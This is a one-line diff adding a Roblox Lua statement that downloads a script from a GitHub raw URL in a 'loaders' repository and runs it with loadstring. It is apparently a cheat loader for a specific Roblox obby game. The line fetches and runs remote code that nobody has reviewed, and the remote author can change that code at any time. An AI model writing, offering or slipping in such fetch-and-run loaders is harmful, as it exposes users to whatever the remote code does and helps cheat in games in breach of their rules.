@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/1-2-player-grapple-cart-obby-spam4-t05k8f9clq0dvy.lua"))()
